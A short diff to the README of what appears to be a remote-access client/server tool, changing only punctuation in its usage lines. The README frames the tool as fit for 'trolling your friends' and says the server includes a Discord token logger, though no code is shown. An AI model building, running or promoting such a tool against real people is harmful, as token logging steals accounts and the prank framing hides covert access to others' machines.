@@ -4,8 +4,8 @@
  Don't use for malicious reasons.
  You can use it for reasons such as trolling your friends or learning from the code.
 
-Usage: python Server.py {ip} {port}
-Example: python Server.py 127.0.0.1 8080
+Usage: python Server.py {ip} {port},
+Example: python Server.py 127.0.0.1 8080.
 
 Client listens to 127.0.0.1:8080 by default. You can always change this.
 Server connects to given ip & port. Also has discord token logger.
